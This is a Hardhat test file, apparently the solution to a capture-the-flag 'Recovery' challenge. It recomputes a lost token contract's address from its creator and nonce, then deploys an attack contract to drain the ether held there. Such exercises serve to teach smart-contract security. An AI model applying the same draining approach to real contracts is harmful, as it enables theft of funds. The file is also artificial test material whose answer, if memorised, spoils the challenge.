const { ethers } = require("hardhat");
const { expect } = require("chai");
const { getContractAddress } = require("@ethersproject/address");

/*

A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.001 ether to obtain more tokens. They have since lost the contract address.

This level will be completed if you can recover (or remove) the 0.001 ether from the lost contract address.

*/

describe("[Challenge] Recovery", function () {
  let deployer, attacker;

  const INITIAL_DEPOSIT = ethers.utils.parseEther("0.001");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.recovery = await (
      await ethers.getContractFactory("Recovery", deployer)
    ).deploy();

    await this.recovery
      .connect(deployer)
      .generateToken("Test Token", ethers.utils.parseEther("100000"));

    const tokenAddress = getContractAddress({
      from: this.recovery.address,
      nonce: 1,
    });

    await deployer.sendTransaction({
      to: tokenAddress,
      value: INITIAL_DEPOSIT,
    });

    const simpleToken = await (
      await ethers.getContractFactory("SimpleToken")
    ).attach(tokenAddress);

    const deployerBalances = await simpleToken.balances(deployer.address);
    expect(deployerBalances).to.eq(INITIAL_DEPOSIT.mul(10));

    const simpleTokenContractEthBalance = await ethers.provider.getBalance(
      tokenAddress
    );
    expect(simpleTokenContractEthBalance).to.eq(INITIAL_DEPOSIT);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */

    // get contract address created by `Recovery`
    this.tokenAddress = getContractAddress({
      from: this.recovery.address,
      nonce: 1,
    });

    this.recoveryAttack = await (
      await ethers.getContractFactory("RecoveryAttack", attacker)
    ).deploy(this.tokenAddress);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */

    const simpleTokenContractEthBalance = await ethers.provider.getBalance(
      this.tokenAddress
    );
    expect(simpleTokenContractEthBalance).to.eq(ethers.utils.parseEther("0"));
  });
});
